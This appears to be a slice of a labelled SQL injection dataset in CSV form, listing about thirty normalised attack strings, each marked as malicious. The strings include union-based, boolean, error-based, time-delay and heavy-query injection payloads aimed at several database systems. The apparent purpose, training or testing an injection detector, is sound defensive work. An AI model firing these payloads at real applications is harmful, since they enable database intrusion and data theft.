row_index,payload_norm,label,sqli_type_hint
2160,"-8429' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'bwih' like 'bwih",1,
2161,"1'|| ( select 'rask' from dual where 9411 = 9411 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",1,
2162,"1%"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,1,
2163,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""pxbk"" like ""pxbk",1,
2164,1' ) where 5871 = 5871,1,
2165,1'+ ( select 'rsgi' where 2258 = 2258,1,
2166,"1'|| ( select 'xyft' from dual where 8250 = 8250 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",1,
2167,-4785' or ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn,1,
2168,"-9318"" ) ) ) union all select 5223,5223,5223,5223#",1,
2169,1%' ) and ( 7704 = 3494 ) *3494 and ( '%' = ',1,
2170,1' ) where 9175 = 9175,1,
2171,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""staz"" like ""staz",1,
2172,1'+ ( select 'lpkv' where 8760 = 8760,1,
2173,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",1,
2174,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( '%' = ',1,
2175,"1'|| ( select 'uqbj' from dual where 6736 = 6736 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2176,"-6370' ) ) as sims where 9388 = 9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",1,
2177,"-9076'+ ( select lqvj where 8551 = 8551 union all select 8551,8551,8551,8551--",1,
2178,-8341 or 8571 = 8571--,1,
2179,"1 ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 9255 = 9255",1,
2180,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( '%' = '",1,
2181,"1' ) where 1323 = 1323 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
2182,1' ) ) as vuzt where 4971 = 4971,1,
2183,"1%' ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2184,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",1,
2185,"-1236'+ ( select 'fbgh' where 3896 = 3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",1,
2186,"1' and make_set ( 2942 = 8200,8200 ) and 'jnhv' like 'jnhv",1,
2187,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'ayol' = 'ayol,1,
2188,"-2925%"" or make_set ( 9354 = 9354,7185 ) and ""%"" = """,1,
2189,"( select * from generate_series ( 4990,4990,case when ( 4990 = 5065 ) then 1 else 0 end ) limit 1 )",1,
